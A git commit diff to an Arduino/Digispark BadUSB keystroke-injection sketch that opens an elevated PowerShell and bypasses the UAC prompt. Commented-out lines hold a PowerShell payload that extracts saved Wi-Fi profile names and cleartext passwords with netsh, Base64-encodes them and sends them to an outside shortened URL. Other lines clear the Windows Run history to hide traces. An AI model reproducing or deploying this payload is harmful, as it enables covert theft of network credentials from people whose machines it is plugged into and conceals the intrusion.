bf6c5d4b4c1f1cd91310bbb53b48aa9d3fb3109f
yvan-allioux <yvan.allioux.pro@gmail.com>
2021-12-05 17:26:53 +0100

    erreur

--- powershell-admin-download-execute/powershell-admin-download-execute.ino
+++ powershell-admin-download-execute/powershell-admin-download-execute.ino
@@ -13,19 +13,26 @@ void setup()
   DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-  DigiKeyboard.delay(1000);
-  // Modify 127.0.0.1 with your IP address and payload.exe with your payload file name
-  //DigiKeyboard.println("Invoke-WebRequest -Uri \"https://tinyurl.com/bdd5j46j?var=$([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Out-String -InputObject ((netsh wlan show profiles) | Select-String \"\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)} | Select-String \"Contenu de la clé\W+\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME123456789123456789123456789123456789=$name; PASSWORD123456789123456789123456789123456789=$pass }})))))\" | Out-Null");
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+
+  DigiKeyboard.println("echo test");
+  //String payload = "Invoke-WebRequest -Uri \"https://tinyurl.com/bdd5j46j?var=$([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Out-String -InputObject ((netsh wlan show profiles) | Select-String \" \"Contenu de la clé\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME123456789123456789123456789123456789=$name; PASSWORD123456789123456789123456789123456789=$pass }})))))\" | Out-Null";
+  //DigiKeyboard.println(payload);
+
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.println("exit");
+  
+  /*DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
   // Clear run command history
-  /* DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
+  DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
   DigiKeyboard.delay(100);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); */
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
-  digitalWrite(1, HIGH);
+  digitalWrite(1, HIGH);*/
 }
 
 /* Unused endless loop */
